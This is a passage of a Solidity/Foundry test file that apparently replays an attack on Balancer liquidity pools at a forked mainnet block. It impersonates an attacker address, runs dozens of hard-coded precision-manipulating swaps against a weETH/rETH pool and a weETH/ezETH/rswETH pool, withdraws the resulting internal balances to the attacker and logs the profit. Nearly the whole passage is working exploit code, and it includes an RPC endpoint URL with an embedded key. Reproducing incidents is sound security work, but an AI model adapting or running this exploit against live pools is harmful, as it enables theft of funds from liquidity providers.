        swaps[21] = ExactSwapData({ tokenIn: weETH_rETH_BPT, tokenOut: weETH, amount: 6, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[22] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 49999999993, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[23] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[24] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH, amount: 350000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[25] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 1900, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[26] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[27] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH, amount: 250000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[28] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 5288, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[29] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[30] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH, amount: 170000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[31] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 305, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[32] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[33] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH, amount: 120000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[34] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 244, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[35] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[36] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH, amount: 90000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[37] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 18286, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[38] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[39] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH, amount: 64000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[40] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 19335, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[41] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[42] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH, amount: 45000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[43] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 2254, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[44] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[45] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH, amount: 32000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[46] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 3744, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[47] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[48] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH, amount: 23000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[49] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 156660, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[50] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[51] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH, amount: 16000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[52] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 559, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[53] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[54] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH, amount: 11000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[55] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 177, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[56] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[57] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH, amount: 8400000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[58] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 328048, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[59] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[60] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH, amount: 6100000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[61] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 96131356, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[62] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[63] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH, amount: 4300000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[64] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 2027, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[65] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[66] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH, amount: 3100000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[67] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 11990, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[68] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[69] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH, amount: 2200000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[70] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 3008, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[71] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[72] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH, amount: 1500000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[73] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 283, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[74] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[75] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH, amount: 1100000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[76] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 1036, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[77] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[78] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH, amount: 800000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[79] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 11039, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[80] = ExactSwapData({ tokenIn: weETH, tokenOut: rETH, amount: 6, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[81] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH, amount: 540000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[82] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH_rETH_BPT, amount: 10000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[83] = ExactSwapData({ tokenIn: weETH, tokenOut: weETH_rETH_BPT, amount: 10000000, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[84] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH_rETH_BPT, amount: 10000000000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[85] = ExactSwapData({ tokenIn: weETH, tokenOut: weETH_rETH_BPT, amount: 10000000000000, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[86] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH_rETH_BPT, amount: 10000000000000000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[87] = ExactSwapData({ tokenIn: weETH, tokenOut: weETH_rETH_BPT, amount: 10000000000000000000, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[88] = ExactSwapData({ tokenIn: rETH, tokenOut: weETH_rETH_BPT, amount: 646775214658039665460, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[89] = ExactSwapData({ tokenIn: weETH, tokenOut: weETH_rETH_BPT, amount: 646775214658039665460, expectedIn: 0, indexIn: 2, indexOut: 0 });


        console.log("Executing swaps...");
        uint256 successCount = 0;

        for (uint i = 0; i < swaps.length; i++) {
            IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_WEETH,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(swaps[i].tokenIn),
                assetOut: IAsset(swaps[i].tokenOut),
                amount: swaps[i].amount,
                userData: ""
            });

            try VAULT.swap(swap, funds, type(uint256).max, block.timestamp + 3600) {
                successCount++;
            } catch {
                // Continue on failure
            }
        }

        console.log("Swaps executed:", successCount, "/", swaps.length);

        // Withdrawal via manageUserBalance
        IERC20[] memory internalTokens = new IERC20[](3);
        internalTokens[0] = IERC20(weETH_rETH_BPT);
        internalTokens[1] = IERC20(rETH);
        internalTokens[2] = IERC20(weETH);

        uint256[] memory internalBalances = VAULT.getInternalBalance(ATTACKER, internalTokens);

        console.log("Internal balances:");
        console.log("  BPT:", internalBalances[0] / 1e18, "ETH");
        console.log("  rETH:", internalBalances[1] / 1e18, "ETH");
        console.log("  weETH:", internalBalances[2] / 1e18, "ETH");

        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0) {
            uint256 opsCount = 0;
            if (internalBalances[0] > 0) opsCount++;
            if (internalBalances[1] > 0) opsCount++;
            if (internalBalances[2] > 0) opsCount++;

            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;

            if (internalBalances[0] > 0) {
                ops[opIndex++] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(weETH_rETH_BPT),
                    amount: internalBalances[0],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            if (internalBalances[1] > 0) {
                ops[opIndex++] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(rETH),
                    amount: internalBalances[1],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            if (internalBalances[2] > 0) {
                ops[opIndex] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(weETH),
                    amount: internalBalances[2],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            VAULT.manageUserBalance(ops);
            console.log("Withdrawal completed!");
        }

        vm.stopPrank();

        (,uint256[] memory finalBalances,) = VAULT.getPoolTokens(POOL_ID_WEETH);

        console.log("FINAL STATE:");
        console.log("BPT:", finalBalances[0]);
        console.log("rETH:", finalBalances[1] / 1e18, "ETH");
        console.log("weETH:", finalBalances[2] / 1e18, "ETH");

        console.log("ATTACKER BALANCES:");
        console.log("BPT:", IERC20(weETH_rETH_BPT).balanceOf(ATTACKER) / 1e18);
        console.log("rETH:", IERC20(rETH).balanceOf(ATTACKER) / 1e18, "ETH");
        console.log("weETH:", IERC20(weETH).balanceOf(ATTACKER) / 1e18, "ETH");

        console.log("Total swaps executed:", successCount);
        console.log("SUCCESS!");
    }

    function testTriplePool() public {
        vm.createSelectFork(
            "https://greatest-prettiest-shard.quiknode.pro/b88e7d9ece3886528f7341abb3eabffa655fdc9c",
            23717101
        );

        console.log("Pool: weETH/ezETH/rswETH (0x848a5564...066a)");

        (IERC20[] memory tokens, uint256[] memory initialBalances,) = VAULT.getPoolTokens(POOL_ID_TRIPLE);

        console.log("INITIAL STATE:");
        console.log("BPT:", initialBalances[0]);
        console.log("ezETH:", initialBalances[1] / 1e18, "ETH");
        console.log("weETH:", initialBalances[2] / 1e18, "ETH");
        console.log("rswETH:", initialBalances[3] / 1e18, "ETH");

        // Fund attacker with BPT
        deal(TRIPLE_BPT, ATTACKER, 10000 ether);

        vm.startPrank(ATTACKER);
        IERC20(TRIPLE_BPT).approve(address(VAULT), type(uint256).max);
        IERC20(ezETH).approve(address(VAULT), type(uint256).max);
        IERC20(weETH).approve(address(VAULT), type(uint256).max);
        IERC20(rswETH).approve(address(VAULT), type(uint256).max);

        IBalancerVault.FundManagement memory funds = IBalancerVault.FundManagement({
            sender: ATTACKER,
            fromInternalBalance: false,
            recipient: payable(ATTACKER),
            toInternalBalance: true
        });

        // swaps from transaction trace
        ExactSwapData[85] memory swaps;

        swaps[0] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: ezETH, amount: 31487826131209268479, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[1] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: weETH, amount: 28452475255668423869, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[2] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: rswETH, amount: 89053036336646360813, expectedIn: 0, indexIn: 0, indexOut: 3 });
        swaps[3] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: ezETH, amount: 314878261312092685, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[4] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: weETH, amount: 284524752556684238, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[5] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: rswETH, amount: 890530363366463608, expectedIn: 0, indexIn: 0, indexOut: 3 });
        swaps[6] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: ezETH, amount: 3148782613120927, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[7] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: weETH, amount: 2845247525566843, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[8] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: rswETH, amount: 8905303633664636, expectedIn: 0, indexIn: 0, indexOut: 3 });
        swaps[9] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: ezETH, amount: 31487826131209, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[10] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: weETH, amount: 28452475255668, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[11] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: rswETH, amount: 89053036336646, expectedIn: 0, indexIn: 0, indexOut: 3 });
        swaps[12] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: ezETH, amount: 314878261312, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[13] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: weETH, amount: 284524752557, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[14] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: rswETH, amount: 890530363367, expectedIn: 0, indexIn: 0, indexOut: 3 });
        swaps[15] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: ezETH, amount: 3148782614, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[16] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: weETH, amount: 2845247526, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[17] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: rswETH, amount: 8905303634, expectedIn: 0, indexIn: 0, indexOut: 3 });
        swaps[18] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: ezETH, amount: 31487826, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[19] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: weETH, amount: 28452475, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[20] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: rswETH, amount: 89053036, expectedIn: 0, indexIn: 0, indexOut: 3 });
        swaps[21] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: ezETH, amount: 314878, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[22] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: weETH, amount: 284525, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[23] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: rswETH, amount: 890530, expectedIn: 0, indexIn: 0, indexOut: 3 });
        swaps[24] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: ezETH, amount: 3149, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[25] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: weETH, amount: 2845, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[26] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: rswETH, amount: 8906, expectedIn: 0, indexIn: 0, indexOut: 3 });
        swaps[27] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: ezETH, amount: 32, expectedIn: 0, indexIn: 0, indexOut: 1 });
        swaps[28] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: weETH, amount: 29, expectedIn: 0, indexIn: 0, indexOut: 2 });
        swaps[29] = ExactSwapData({ tokenIn: TRIPLE_BPT, tokenOut: rswETH, amount: 90, expectedIn: 0, indexIn: 0, indexOut: 3 });
        swaps[30] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 4999999984, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[31] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[32] = ExactSwapData({ tokenIn: ezETH, tokenOut: weETH, amount: 18000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[33] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 2692, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[34] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[35] = ExactSwapData({ tokenIn: ezETH, tokenOut: weETH, amount: 13000000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[36] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 306830, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[37] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[38] = ExactSwapData({ tokenIn: ezETH, tokenOut: weETH, amount: 9300000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[39] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 21054, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[40] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[41] = ExactSwapData({ tokenIn: ezETH, tokenOut: weETH, amount: 6600000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[42] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 14075, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[43] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[44] = ExactSwapData({ tokenIn: ezETH, tokenOut: weETH, amount: 4700000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[45] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 8182, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[46] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[47] = ExactSwapData({ tokenIn: ezETH, tokenOut: weETH, amount: 3300000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[48] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 1828, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[49] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[50] = ExactSwapData({ tokenIn: ezETH, tokenOut: weETH, amount: 2300000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[51] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 584, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[52] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[53] = ExactSwapData({ tokenIn: ezETH, tokenOut: weETH, amount: 1700000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[54] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 370877, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[55] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[56] = ExactSwapData({ tokenIn: ezETH, tokenOut: weETH, amount: 1200000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[57] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 233, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[58] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[59] = ExactSwapData({ tokenIn: ezETH, tokenOut: weETH, amount: 910000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[60] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 1001851, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[61] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[62] = ExactSwapData({ tokenIn: ezETH, tokenOut: weETH, amount: 810000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[63] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 13960, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[64] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[65] = ExactSwapData({ tokenIn: ezETH, tokenOut: weETH, amount: 531000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[66] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 78, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[67] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[68] = ExactSwapData({ tokenIn: ezETH, tokenOut: weETH, amount: 420000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[69] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 7176, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[70] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[71] = ExactSwapData({ tokenIn: ezETH, tokenOut: weETH, amount: 300000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[72] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 18633, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[73] = ExactSwapData({ tokenIn: weETH, tokenOut: ezETH, amount: 15, expectedIn: 0, indexIn: 2, indexOut: 1 });
        swaps[74] = ExactSwapData({ tokenIn: ezETH, tokenOut: weETH, amount: 210000000000, expectedIn: 0, indexIn: 1, indexOut: 2 });
        swaps[75] = ExactSwapData({ tokenIn: ezETH, tokenOut: TRIPLE_BPT, amount: 10000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[76] = ExactSwapData({ tokenIn: weETH, tokenOut: TRIPLE_BPT, amount: 10000000, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[77] = ExactSwapData({ tokenIn: rswETH, tokenOut: TRIPLE_BPT, amount: 10000000000, expectedIn: 0, indexIn: 3, indexOut: 0 });
        swaps[78] = ExactSwapData({ tokenIn: ezETH, tokenOut: TRIPLE_BPT, amount: 10000000000000, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[79] = ExactSwapData({ tokenIn: weETH, tokenOut: TRIPLE_BPT, amount: 10000000000000000, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[80] = ExactSwapData({ tokenIn: rswETH, tokenOut: TRIPLE_BPT, amount: 10000000000000000000, expectedIn: 0, indexIn: 3, indexOut: 0 });
        swaps[81] = ExactSwapData({ tokenIn: ezETH, tokenOut: TRIPLE_BPT, amount: 47499890220466816244, expectedIn: 0, indexIn: 1, indexOut: 0 });
        swaps[82] = ExactSwapData({ tokenIn: weETH, tokenOut: TRIPLE_BPT, amount: 47499890220466816244, expectedIn: 0, indexIn: 2, indexOut: 0 });
        swaps[83] = ExactSwapData({ tokenIn: rswETH, tokenOut: TRIPLE_BPT, amount: 47499890220466816244, expectedIn: 0, indexIn: 3, indexOut: 0 });
        swaps[84] = ExactSwapData({ tokenIn: ezETH, tokenOut: rswETH, amount: 41000000000000000000, expectedIn: 0, indexIn: 1, indexOut: 3 });


        console.log("Executing swaps...");
        uint256 successCount = 0;

        for (uint i = 0; i < swaps.length; i++) {
            IBalancerVault.SingleSwap memory swap = IBalancerVault.SingleSwap({
                poolId: POOL_ID_TRIPLE,
                kind: IBalancerVault.SwapKind.GIVEN_OUT,
                assetIn: IAsset(swaps[i].tokenIn),
                assetOut: IAsset(swaps[i].tokenOut),
                amount: swaps[i].amount,
                userData: ""
            });

            try VAULT.swap(swap, funds, type(uint256).max, block.timestamp + 3600) {
                successCount++;
            } catch {
                // Continue on failure
            }
        }

        console.log("Swaps executed:", successCount, "/", swaps.length);

        // withdraw manageUserBalance
        IERC20[] memory internalTokens = new IERC20[](4);
        internalTokens[0] = IERC20(TRIPLE_BPT);
        internalTokens[1] = IERC20(ezETH);
        internalTokens[2] = IERC20(weETH);
        internalTokens[3] = IERC20(rswETH);

        uint256[] memory internalBalances = VAULT.getInternalBalance(ATTACKER, internalTokens);

        console.log("Internal balances:");
        console.log("  BPT:", internalBalances[0] / 1e18, "ETH");
        console.log("  ezETH:", internalBalances[1] / 1e18, "ETH");
        console.log("  weETH:", internalBalances[2] / 1e18, "ETH");
        console.log("  rswETH:", internalBalances[3] / 1e18, "ETH");

        if (internalBalances[0] > 0 || internalBalances[1] > 0 || internalBalances[2] > 0 || internalBalances[3] > 0) {
            uint256 opsCount = 0;
            if (internalBalances[0] > 0) opsCount++;
            if (internalBalances[1] > 0) opsCount++;
            if (internalBalances[2] > 0) opsCount++;
            if (internalBalances[3] > 0) opsCount++;

            IBalancerVault.UserBalanceOp[] memory ops = new IBalancerVault.UserBalanceOp[](opsCount);
            uint256 opIndex = 0;

            if (internalBalances[0] > 0) {
                ops[opIndex++] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(TRIPLE_BPT),
                    amount: internalBalances[0],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            if (internalBalances[1] > 0) {
                ops[opIndex++] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(ezETH),
                    amount: internalBalances[1],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
                });
            }

            if (internalBalances[2] > 0) {
                ops[opIndex++] = IBalancerVault.UserBalanceOp({
                    kind: IBalancerVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                    asset: IAsset(weETH),
                    amount: internalBalances[2],
                    sender: ATTACKER,
                    recipient: payable(ATTACKER)
